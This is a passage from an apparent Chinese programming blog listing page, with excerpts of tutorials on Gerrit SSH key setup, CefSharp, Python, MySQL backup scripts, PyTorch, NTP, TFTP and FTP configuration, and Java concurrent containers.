注册gerrit用户 注册Gerrit账户，需给联系Gerrit管理者获取账号。
假如你已经有了账号，请登录你的gerrit服务。
注册账户邮箱 一旦你登录了账号，并且没有设置过邮箱，那么请注册：
用户注册邮箱请参考这里
配置秘钥 如果你是一个新用户，请将你工作的本机秘钥添加到你的gerrit账号下，以便可以正确拉取推送项目。
1.获取秘钥 Linux系统 # 查看当前用户是否存在秘钥, 如果不存在需要通过ssh-keygen进行生成 # 秘钥生成 ssh-keygen -t rsa -C "youemail@xxx.com" # 复制秘钥 cat ~/.ssh/id_rsa.pub 如果提示权限问题：可能是版本级别太高，通过以下方式生产秘钥 ssh-key -t ed25519 -C "youemail@xxxx.com" Windows系统
进入C:\Users\USER.ssh目录确认是否有秘钥， 如果没有通过以下命令生成 # 打开CMD DOS生成秘钥 ssh-keygen -t rsa -C "youemail@xxx.com" 拷贝id_rsa.pub公钥。
2.设置秘钥 当获取到了公钥之后，登录到gerrit服务，将公钥添加到gerrit账户中：
复制公钥：
开发人员 1.拉取项目 用户开发者一旦获取到自己的gerrit账号后，就已经有了自己相应的权限了。
开发者可以通过BROWES-&gt;Respositories中查看自己账号下挂载了的项目情况。
我们可以看到下图显示了只有一个tinyalsa的项目
那么我们如何拉取项目呢。 只有点击tinyalsa进入界面就可以看到有两种拉取方式：
with commit-msg hook
commit-msg 是一个脚本文件，该脚本对于 Gerrit 的使用非常重要，使用 Gerrit 必须要有此脚本，否则在本地的修改版本无法提交至 Gerrit 中，会报错：missing change-id in commmit message footer，表示该版本提交没有 change-id。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9716d2ea6dd4b4295591e0ce91bf835/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08c9be6d910bb6b368f327f9f8aae089/" rel="bookmark">
			C# （江湖熟手）- Cefsharp 的使用（几行代码写个浏览器）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装 Cefsharp简介 CEF ，全称Chromium Embedded Framework ，基于谷歌 Chromium项目的开源Web Browser控件，它的主要用途是嵌入了第三方应用以实现浏览器相关的功能。例如国内的360安全浏览器的兼容模式即IE的内核，极速模式即Chromium内核；最近微软新推出的Microsoft Edge也是基于Chromium开源项目实现的
CefSharp是Cef的C#版本，让Chromium浏览器也可嵌入WinForms 中
安装步骤 第一步：右键项目，点击 管理NuGet程序包 , 输入Cefsharp 关键字搜索, 选择 CefSharp.WinForms 进行安装 安装完后，以packages.config中可以看到如下信息
第二步：修改配置管理器，将平台修改为X86或X64，Cef有32和64位之分 在 活动方案解决平台 下拉，点击新建
选择 X86 ，点击确定，接着关闭即可
第三步：编写代码，初始化浏览器 using CefSharp; using CefSharp.WinForms; using System.Windows.Forms; namespace 我的浏览器 { public partial class Form1 : Form { // 浏览器对象 public ChromiumWebBrowser chromeBrowser; public Form1() { InitializeComponent(); } public void InitCef() { //参数设置 CefSettings settings = new CefSettings(); // settings.Locale = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08c9be6d910bb6b368f327f9f8aae089/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8522360aa31c48cf2257e006341f3461/" rel="bookmark">
			2023编程必会的100个代码大全，建议立刻收藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 我记得刚开始接触编程的时候，觉得太难了。也很好奇，写代码的那些人也太厉害了吧？全是英文的，他们的英文水平一定很好吧？他们是怎么记住这么多代码格式的？而且错了一个标点符号，整个程序都会有影响。一个程序几千行，错一个标点符号都不行这也太难了吧？带着新手的灵魂拷问，作为从业单片机编程10年的开发者，我来为大家拨开云雾。看完以后你就会明白，其实他们也没那么厉害！即便你是初中文凭，也照样能编程。对于python语言来说，要记得东西其实不多，基本就是几个常用语句加一些关键字而已。你所看到的那些几千甚至上万行的代码，都是用这些语句和关键词来重复编写的。只是他们逻辑功能不一样，另外的那些英文，都是程序员自己起的，比如说一些变量的名字，函数的名字。如果你喜欢你定义成abc都可以，只不过为了程序大了以后为了方便阅读和维护，我们一般起跟要实现的功能相同的英文缩写代替。比如说我要存储一个电压值，那你可以定义一个变量，名字叫VoltageValue,或者这两个词的缩写VoltVal。所以，大家不要把这个想得这么神秘和高大上。
1、for循环中的else条件 这是一个for-else方法，循环遍历列表时使用else语句。
下面举个例子，比如我们想检查一个列表中是否包含奇数。
那么可以通过for循环，遍历查找。
numbers = [2, 4, 6, 8, 1] for number in numbers: if number % 2 == 1: print(number) break else: print("No odd numbers") 2、数字求和 # -*- coding: UTF-8 -*- # Filename : test.py # author by : www.runoob.com # 用户输入数字 num1 = input('输入第一个数字：') num2 = input('输入第二个数字：') # 求和 sum = float(num1) + float(num2) # 显示计算结果 print('数字 {0} 和 {1} 相加结果为：{2}'.format(num1, num2, sum)) 执行以上代码输出结果为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8522360aa31c48cf2257e006341f3461/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0accf44fa1a507714801066b23e9f7f0/" rel="bookmark">
			REGEXP_REPLACE() 函数，替换字符串中特定字符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 SELECT REGEXP_REPLACE('QUERY_DB_NAME','DB','db') FROM TABLE_NAME; 结果：QUERY_db_NAME 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a6c2cd8faa8b3bc13aff6ff7d8e09a4/" rel="bookmark">
			Pytorch学习记录【1】Dataset的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、数据集torch.utils.data.Dataset
1、数据集torch.utils.data.Dataset pytorch导入数据集主要依靠Dataset类。其中Dataset类是一个抽象类，在构建我们自己的MyDataset类时需要继承Dataset类。并重写（overwrite）它的两个方法：__getitem__和__len__。
方法说明__getitem__（self, index）根据传入的index参数返回列表中对应下标的一条数据（包括图片和标签）。__len__(self)返回数据集的长度。 （1）实现MyDataset类
from torch.utils.data import Dataset import os from PIL import Image class MyDataset(Dataset): def __init__(self, root_dir, label): self.root_dir = root_dir # 图片所在的根目录路径 self.label = label # 图片的标签 # 图片所在的根目录路径下所有图片的名称， # 在__getitem__方法中会通过图片名称来获取图片的路径。 self.image_name = os.listdir(self.root_dir) """重写__getitem__方法""" def __getitem__(self, index): # 获取完整图片路径 image_path = os.path.join(self.root_dir, self.image_name[index]) # 读取图片 image = Image.open(image_path) label = self.label # 返回对应下标的图片和label return image, label """重写__len__方法""" def __len__(self): # 返回数据集长度 return len(self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a6c2cd8faa8b3bc13aff6ff7d8e09a4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8c2ef2d021b0cbf6cb18a7d0f0e227e/" rel="bookmark">
			Resnet课堂PPT演示手写学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面分享一下我在学习Resnet的时候做的一些笔记吧，希望对大家有用。如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d2f0ad61063a6e0060e9ccaf747b9ca/" rel="bookmark">
			Shell–案例–04–mysql数据库备份和还原
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Shell–案例–04–mysql数据库备份和还原 1、自动备份数据库 1.1、脚本 #创建目录 mkdir -p /data/mysql/dbback/ cd /data/mysql/dbback/ vim backup.sh 内容
#!/bin/bash #保存备份个数，备份10个数据 number=10 #备份保存路径 backup_dir=/data/mysql/dbback #日志目录 log_dir=$backup_dir/log/ #日期 dd=`date +%Y-%m-%d-%H-%M-%S` #备份工具 tool=/data/mysql/install/bin/mysqldump #将要备份的数据库 database_name1=test database_name2=test2 # 备份文件名称 backFile_name=database-$dd.sql #用户名 username=root #密码 password=1234 # 数据库IP和端口 db_ip=127.0.0.1 db_port=3307 # mysql.sock目录 sock_dir=/data/mysql/tmp/mysql.sock #如果文件夹不存在则创建 if [ ! -d $log_dir ]; then mkdir -p $log_dir; fi #简单备份写法 $tool -h${db_ip} -P${db_port} -u$username -p$password -S $sock_dir --set-gtid-purged=OFF --add-drop-database --compact --databases $database_name1 $database_name2 &gt; $backup_dir/$backFile_name #写创建备份日志 echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d2f0ad61063a6e0060e9ccaf747b9ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19c7a27e3cdb2fcca7f45d21e6a73b4a/" rel="bookmark">
			Linux该如何学习（新手入门必看）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何去学习 学习大多类似庖丁解牛，对事物的认识一般都是由浅入深、由表及里的过程，循序才能渐进。学习 Linux 同样要有一定的顺序和方法。如果你是初学者，那么建议按照本教程的顺序阅读，不要跳跃，欲速则不达，揠苗也不见得能助长。
另外，强烈建议做好读书笔记，边看边记，边练习边思考，“学而不思则罔，思而不学则殆”，比勤奋更重要的是思考的能力，不要傻学、死学。养成看书的好习惯，学习类的图书如果没能看成自己知识的积累，就是白读。一本书，可能看一遍是不够的，多次阅读，反复实践，才能印象深刻。实践是检验真理的唯一标准，实践出真知。
方法有了，贵在坚持。制定好自己的学习目标，设定奖惩，确定详细的时间进度表，开始行动！保持热情，坚定目标，做好计划，希望你、不会让本教程变成你的收藏品，而是成为一套可能会改变你职场命运的技术指导教程，那将是我们最大的荣幸。
碰到问题怎么办 任何人学习和使用 Linux 或多或少会遇到问题，很多人遇到问题的第一个念头就是问人。没错！这可以快速解决问题。但是我们建议你，先尝试自己解决问题，询问别人获得答案固然好，但是对于知识的积累和提升解决问题的能力并没有帮助，不要做依赖别人帮助的懒虫。
在寻找答案的过程中，虽然会花费很多时间，也可能会遇到挫折，但久而久之你会发现，也许为了找一个问题的解答，你了解了 Linux 很多相关的知识，经验也越来越丰富。记住，你不可能永远有人问，也不可能永远有人愿意回答你。
Linux 系统的一个非常大的好处是，当命令执行错误或系统设置错误时，通常会清楚地显示错误信息，告诉你哪里出错了，只要认真观察报错信息，大概就知道问题出现在哪里，应该如何解决了。有的操作步骤复杂，出现状况时，回头检査一下，是不是前面步骤的命令敲错或配置文件改错。
Linux 的帮助文档是很好的工具，命令的选项、配置文件的设置都可以从这里找到答案；我们在提问前，一定要先在网络上寻找答案，借用一句广告语"百度一下，你就知道"，没有人愿意回答网上一搜就可以找到答案的问题。
提问时，确认你已经做了上述事情，这有助于树立你不是寄生虫与浪费别人时间的形象。轻率的提问只能得到轻率的回答，或者压根儿没人理你。
有的被询问者常常不是很清楚初学者要问什么，因为初学者没有完整、清楚地描述问题。在求助他人时，说明要做什么、做了什么，列出完整的操作步骤、错误信息或错误截图，描述清晰，让别人能看懂你的问题，否则笔者就算变成超人也帮不了你。
在请教问题时，要注意礼貌。很多年轻人，多了一点理所应当，少了一些礼貌用语，你自然会感到世态炎凉，技术圈子没有人性，毕竟人家不回答你是本分，回答你是人情。
另外，千万不要问那种令人头疼的问题，如 Linux 怎么备份、Linux 权限有哪些、xx 服务怎么配置、oo 脚本帮写一个……你问饺子皮为什么这么擀会破，我可以告诉你；你问怎么包饺子，这就是你找茬儿了，先在网上找找，人生苦短，快用百度，然后照猫画虎时哪个步骤有问题你再问……
提问，也是一种智慧。
英文读不懂怎么办 初学者在学习命令时问得最多的就是这两个问题：输入的文件或目录名称错误、命令没有被发现（命令敲错了）。
能看懂 Linux 的英文提示及英文文档非常重要。其实计算机英语很简单，只要熟记了计算机专业英语单词，高中毕业的英文水平就可以轻松阅读英文文档了。
即便你的英文水平实在太差了，连最简单的计算机英文文档都看不懂，那么在学习 Linux 的同时学学英语，每天从背一定量的单词开始吧！
笔者给各位读者的建议是每天背 30 个在电脑上看到的不认识的单词，30 个单词不需要你会读、会写、会念，看到单词知道意思即可，一般 3~5 个月，常见的计算机英语都能看厪。
忘记Windows的思维方式 思想的转变比暂时性的技术提高更重要，因为它能帮助你加快学习速度。很多人使用 Linux 时骨子里却还是 Windows 的思想，比如讲 Linux 安装都会有读者问：“是把 Linux 装在 C 盘吗？”，可见被 Windows“毒害”之深。
Windows 是一个优秀的系统，它的易用性非常好，不过也正是因为易用性好，使用者往往不了解自己所做操作的原理。
大多数初学者已经习惯了使用 Windows 的图形界面来完成操作，可是我们在学习和日后使用 Linux 时基本上在命令行模式下，这让很多初学者很头疼也很困惑。
这里的问题是"如何有效利用系统资源"，X Window 本身相当消耗系统资源，这也就是在架设 Linux 服务器时不启动图形界面的原因。如果你想深入了解 Linux，就必须学习命令行操作。
所以，我们在开始学习 Linux 之前，要不被 Windows 的思想所束缚。这其实是一个使用习惯的问题，笔者常常想，如果我们第一个接触的操作系统就是 Linux，那么之后我们再学习 Windows，可能我们也会感慨"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19c7a27e3cdb2fcca7f45d21e6a73b4a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b46b950f9f3c48336c78a9619442695/" rel="bookmark">
			Python 求2个正整数的最小公倍数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设这两个正整数分别为 x 和 y，最小公倍数是 z。
求最小公倍数的常见方法是使用辗转相除法求 x 和 y 的最大公约数，再用 z=xy/gcd(x,y) 求出最小公倍数。
如果你不知道辗转相除法是什么，可以先查阅一下资料。
下面是使用 Python 实现的代码：
defgcd(x, y): while y != 0: x, y = y, x % y return x def lcm(x, y): return x * y // gcd(x, y) x = 6 y = 8 z = lcm(x, y) print(z) 输出结果为 24，即最小公倍数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1e833e92d15665a2e8a3bfaf09c2387/" rel="bookmark">
			【C#】 三种计算程序运行时间的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 System.DateTime.NowStopwatchc++ API System.DateTime.Now 属性 Now 返回一个 DateTime 值，该值表示本地计算机上的当前日期和时间。 请注意，值（表示自 0001 年 1 月 1 日午夜以来经过的计时周期数）与该值DateTime的字符串表示形式（以特定于区域性的格式表示日期和时间值）之间存在DateTime差异。
准确性受服务器时间影响
DateTime dt1 = System.DateTime.Now; System.Threading.Thread.Sleep(time_cap); DateTime dt2 = System.DateTime.Now; TimeSpan ts = dt2.Subtract(dt1); Console.WriteLine("example1 time {0}", ts.TotalMilliseconds); Stopwatch Stopwatch 在基础计时器机制中对计时器的计时周期进行计数，从而测量运行时间。 如果安装的硬件和操作系统支持高分辨率性能计数器，则 Stopwatch 类将使用该计数器来测量运行时间； 否则，Stopwatch 类将使用系统计数器来测量运行时间。 使用 Frequency 和 IsHighResolution 字段可以确定实现 Stopwatch 计时的精度和分辨率。
System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch(); sw.Start(); System.Threading.Thread.Sleep(time_cap); sw.Stop(); //这个是实例运行的毫秒数 //sw.ElapsedMilliseconds TimeSpan ts2 = sw.Elapsed; Console.WriteLine("example2 time {0}", ts2.TotalMilliseconds); c++ API 如果已安装的硬件支持高分辨率性能计数器，则返回值为非零值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1e833e92d15665a2e8a3bfaf09c2387/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae27e4cb82493aefe7118dcc0ec3d24e/" rel="bookmark">
			MySQL 字符串的排序规则解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据库，表信息如下： - 字符集：utf8 - 排序规则：utf8_general_ci（不区分大小写） 1. 数字排序（Unicode编码10进制）： 数字 0 编码值：48 数字 1 编码值：49 数字 2 编码值：50 排序（mysql默认升序）："11111" &gt; "1200" &gt; "12101" 2. 字母排序（Unicode编码10进制）： 字母 a 编码值：97 字母 b 编码值：98 排序（mysql默认升序）："aa" &gt; "aab" &gt; "ab" 3. 中文排序（Unicode编码10进制）： 中文 阿 编码值：38463 中文 白 编码值：30333 排序（mysql默认升序）："白" &gt; "阿" &gt; "阿白" 4. 数字，字母，中文混合排序： "1b白" &gt; "1b阿" &gt; "1白阿a" &gt; "1阿a" &gt; "1阿b" &gt; "4" &gt; "a" &gt; "阿" 总结： 1. 当字段类型为string型时，字符串排序是先比较字符串第一个字符的大小(Unicode编码10进制大小) 2. 当字段类型为int型时，比较整个数字的大小 编码网站：http://www.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae27e4cb82493aefe7118dcc0ec3d24e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfe8c8b33b945698fe3b9a1603e11bad/" rel="bookmark">
			【Js】前端使用xlsx.full.min.js读取和导出excel表格数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 简介使用js-xlsx的xlsx.full.min.js读取导出 来源 简介 由SheetJS出品的js-xlsx是一款非常方便的只需要纯JS即可读取和导出excel的工具库，功能强大，支持格式众多，支持xls、xlsx、ods(一种OpenOffice专有表格文件格式)等十几种格式。本文全部都是以xlsx格式为例。
使用js-xlsx的xlsx.full.min.js 读取 excel 数据：
结果：
代码如下，需要引入xlsx.full.min.js下载地址
另有：CSDN Github 加速下载地址
&lt;!doctype html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;script type="text/javascript" src='./xlsx.full.min.js'&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; 文件：&lt;br&gt; &lt;input type="file" id="file"&gt;&lt;br&gt; &lt;/body&gt; &lt;script&gt; //首先监听input框的变动，选中一个新的文件会触发change事件 document.querySelector("#file").addEventListener("change", function () { //获取到选中的文件 var file = document.querySelector("#file").files[0]; var type = file.name.split('.'); if (type[type.length - 1] !== 'xlsx' &amp;&amp; type[type.length - 1] !== 'xls') { alert('只能选择excel文件导入'); return false; } const reader = new FileReader(); reader.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfe8c8b33b945698fe3b9a1603e11bad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8cc1b01c5629de6a43cbe39a11564a5/" rel="bookmark">
			Python数据处理与分析小项目-分析员工过早离职原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目介绍 背景说明 本篇通过描述性分析、相关性分析、变量之间的对比分析来解析影响公司员工离职的因素。以及公司应该思考和解决的问题。
人力资源分析数据集汇聚了对大量员工的信息数据统计，包括企业因素（如部门）、员工行为相关因素（如参与过项目数、每月工作时长、薪资水平等）、以及工作相关因素（如绩效评估、工伤事故）
数据说明 文件HR_comma_sep.csv中包含10个字段，具体信息如下：
No属性数据类型字段描述1satisfaction_levelFloat员工满意程度：0-不满意，1-满意2last_evaluationFloat国家3number_projectInteger在职期间完成的项目数量4average_montly_hoursInteger每月平均工作时长（hr）5time_spend_companyInteger 工龄（年）6work_accidentInteger是否有工伤：0-没有，1-有7leftInteger是否离职：0-在职，1-离职8promotion_last_5yearsInteger过去5年是否有升职：0-没有，1-有9salesString工作部门10salaryString工资的相对等级 数据来源 https://www.kaggle.com/mizanhadi/hr-employee-data-visualisation/data?select=HR_comma_sep.csv
百度云下载链接：
链接：https://pan.baidu.com/s/1G3uT2Bs7MUnjrFmh4vB_Xg
提取码：abcd
安装相关包
!pip install plotly==2.7.0 -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn !pip install colorlover -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn 导入相关包
import pandas as pd import numpy as np from plotly import __version__ print (__version__) from plotly.offline import init_notebook_mode, iplot init_notebook_mode(connected=True) from plotly.graph_objs import * import colorlover as cl import matplotlib.pyplot as plt import seaborn as sns colors = ['#e43620', '#f16d30','#d99a6c','#fed976', '#b3cb95', '#41bfb3','#229bac', '#256894'] 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8cc1b01c5629de6a43cbe39a11564a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/096b56f2219ed0265244208359ff7bbe/" rel="bookmark">
			[ 数据结构 ] 最小生成树(MST)--------普里姆算法、克鲁斯卡尔算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0 修路问题 有胜利乡有 7 个村庄(A, B, C, D, E, F, G) ，现在需要修路把 7 个村庄连通各个村庄的距离用边线表示(权) ，比如 A – B 距离 5 公里问：如何修路保证各个村庄都能连通，并且总的修建公路总里程最短?
思路: 将 10 条边，连接即可，但是总的里程数不是最小. 正确的思路，就是尽可能的选择少的路线，并且每条路线最小，保证总里程数最少. 1 最小生成树 修路问题本质就是就是最小生成树问题最小生成树(Minimum Cost Spanning Tree)，简称 MST,给定一个带权的无向连通图,如何选取一棵生成树,使树上所有边上权的总和为最小,这叫最小生成树MST特征:N 个顶点,一定有 N-1 条边,包含全部顶点,N-1 条边都在图中,如下图求最小生成树的算法主要是普里姆算法和克鲁斯卡尔算法 2 普里姆算法 宏观理解:
选择任一顶点A作为起始点选择A周围可直连且未访问过的顶点中距离最近的,G点,标记为已访问对已访问的顶点A和G,分别执行第2步,得到下一个顶点B并标记已访问重复执行第3步直到已访问顶点数涵盖所有图顶点得到最小生成树 微观理解:
代码核心为内外三层for循环,辅助工具为2个指针i、j,以及访问情况数组visited最外层for表示需要选择几轮顶点才能得到最小生成树中间层for用于使指针i指向已访问顶点最内层for用于使指针j指向未访问顶点遍历过程中如果顶点i和j间的边为本轮最短,则得到本轮最短路径最终所有最短路径,及其经过的顶点,就是最小生成树 //普利姆算法:修路问题,最小生成树 public class PrimAlgorithm { public static void main(String[] args) { char[] data = new char[]{'A','B','C','D','E','F','G'}; int verxs = data.length; //邻接矩阵的关系使用二维数组表示,10000 这个大数，表示两个点不联通 int[][] weight = new int[][]{ {10000, 5, 7, 10000, 10000, 10000, 2}, {5, 10000, 10000, 9, 10000, 10000, 3}, {7, 10000, 10000, 10000, 8, 10000, 10000}, {10000, 9, 10000, 10000, 10000, 4, 10000}, {10000, 10000, 8, 10000, 10000, 5, 4}, {10000, 10000, 10000, 4, 5, 10000, 6}, {2, 3, 10000, 10000, 4, 6, 10000},}; MinTree tree = new MinTree(); MGraph mGraph = new MGraph(verxs); tree.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/096b56f2219ed0265244208359ff7bbe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0118dcbcd3d13ff22b24d5ffcffbdd1/" rel="bookmark">
			Ubuntu自动校准时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言
方法1：ntpdate每天校准时间
方法2：ntpd连续定时校准时间
方法3：临时手动校准时间
前言 我们在使用Ubuntu时，时间准确很重要，我们想要让其在联网状态下自动校准时间，有以下两种方法
方法1：ntpdate每天校准时间 sudo apt-get install -y ntpdate #安装ntpdate
sudo vim /etc/cron.daily/ntpdate #用vim打开此文件添加内容
sudo ntpdate ntp.ubuntu.com cn.pool.ntp.org #输入这行内容
#按键盘上的Esc键退出输入模式
#输入“:wq”命令进行保存退出
sudo chmod 755 /etc/cron.daily/ntpdate #进行文件权限修改
sudo ntpdate -d cn.pool.ntp.org #同步时间
方法2：ntpd连续定时校准时间 sudo apt-get install -y ntp #安装ntp
vim /etc/ntp.conf #用vim打开此文件添加内容
server cn.pool.ntp.org #输入这行内容
#按键盘上的Esc键退出输入模式
#输入“:wq”命令进行保存退出
/etc/init.d/ntp restart #重启
方法3：临时手动校准时间 sudo ntpdate -u ntp.aliyun.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fec30d780921aac0334ec9fed468a8ca/" rel="bookmark">
			【Linux篇】之TFTP服务配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tftp是基于UDP协议的简单文本文件传输协议；
用途：使用网络的方式将文件传输(下载)到开发板中。
具体的tftp服务的安装步骤：
1&gt; 安装tftp服务 (ubuntu必须可以上网)
sudo apt-get update ----&gt; 更新源
sudo apt-get install tftpd-hpa tftp-hpa
tftpd-hpa : 服务器端
tftp-hpa ：客户端
2&gt; 修改tftp服务的配置文件
打开tftp服务的配置文件：
sudo vi /etc/default/tftpd-hpa
将文件中的如下内容：
#/etc/default/tftpd-hpa
TFTP_USERNAME=“tftp”
TFTP_DIRECTORY=“/var/tftpboot”
TFTP_ADDRESS=“:69”
TFTP_OPTIONS=“–secure”
修改为：
#/etc/default/tftpd-hpa
TFTP_USERNAME=“tftp”
TFTP_DIRECTORY=“/home/linux/tftpboot”
TFTP_ADDRESS=“0.0.0.0:69”
TFTP_OPTIONS=“-c -s -l”
解析/etc/default/tftpd-hpa文件中内容的含义：
TFTP_USERNAME=“tftp” —&gt; tftp服务的用户名
TFTP_DIRECTORY=“/home/linux/tftpboot”
—&gt; TFTP服务的路径， 需要修改为自己的tftp服务的路径
需要将使用tftp下载的文件放到这个参数指定的路径下才可以
比如：如果将某个文件下载到开发板中，需要将此文件拷贝到~/tftpboot目录下
TFTP_ADDRESS=“0.0.0.0:69”–&gt; TFTP服务的IP地址和端口号，默认为69号
TFTP_OPTIONS=“-c -s -l” —&gt; TFTP服务的配置选项
3&gt; 在ubuntu的家目录下创建tftpboot目录
tftpboot目录的作用：将要使用tftp服务下载到开发板的程序存到这个目录下，
当使用tftp服务下载程序时，tftp就会从tftpboot目录下查找你要下载的文件名。
cd ~
mkdir tftpboot
chmod 777 tftpboot
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fec30d780921aac0334ec9fed468a8ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/985beb19dd36848bbf642b22d4e126ee/" rel="bookmark">
			【FTP服务搭建】使用windows虚拟机搭建ftp服务，并能够使用ftp进行传输文件的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考了两位大佬写的教程，自己实践了一下，整理了一下操作步骤
使用机器： win10虚拟机、win7虚拟机
实验准备 win10下载filezilla下载地址、win10虚拟机关闭防火墙、两台机器可以相互 ping通，保证两台设备的IP地址需要在同一网段，如果不在同一网段则需要配置静态IP。
实验步骤
虚拟机win7启用ftp服务。
注意！
1.这里一定要勾选FTP服务器，保证该目录下的FTP服务和FTP扩展性都已经勾选，如果不全选将不会出现添加FTP节点。
2.还要确认是FTP服务器不是TFTP服务，选择TFTP服务不会出现IIS管理器
win7虚拟机搜索栏搜索 IIS 打开 IIS 管理器,右击添加ftp站点。
填写站点名称和物理路径。
填写IP地址和端口号，SSL服务选无。
FTP服务默认端口号为21
身份验证和权限全部勾选，权限选择所有用户。
这里可以针对不同的账户设置不同的权限
具体操作可以参考大佬的文章
win7下利用IIS搭建FTP服务器
在网站下出现下图红框中的图标即为成功。
win10虚拟机打开filezilla，输入信息：
主机：虚拟机win7的IP地址
用户名：虚拟机win7的用户名
密码：虚拟机win7的密码
端口可以为空，默认21端口
点击快速链接，图为连接成功。
新建测试文件，将文件拖入右侧窗口中，状态显示成功，成功的传输显示数量加1。
打开虚拟机win7，进入物理地址所填写的文件夹，发现测试文件，FTP服务搭建成功。
需要注意的是filezilla长时间不操作可能出现连接断开的情况。
如有错误，欢迎批评指正[鞠躬]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eabdcd8b7aff8ecf0c9448821b34406f/" rel="bookmark">
			Java并发容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、并发容器总结 1、大部分在 java.util.concurrent 包中。 ConcurrentHashMap: 线程安全的HashMap
CopyOnWriteArrayList: 线程安全的List，在读多写少的场合性能非常好，远远好于Vector.
ConcurrentLinkedQueue: 高效的并发队列，使用链表实现。可以看做一个线程安全的 LinkedList，这是一个非阻塞队列。
BlockingQueue: 这是一个接口，JDK内部通过链表、数组等方式实现了这个接口。表示阻塞队列，非常适合用于作为数据共享的通道。
ConcurrentSkipListMap: 跳表的实现。这是一个Map，使用跳表的数据结构进行快速查找。
2、 ConcurrentHashMap JDK1.7
首先将数据分为一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段数据时，其他段的数据也能被其他线程访问。
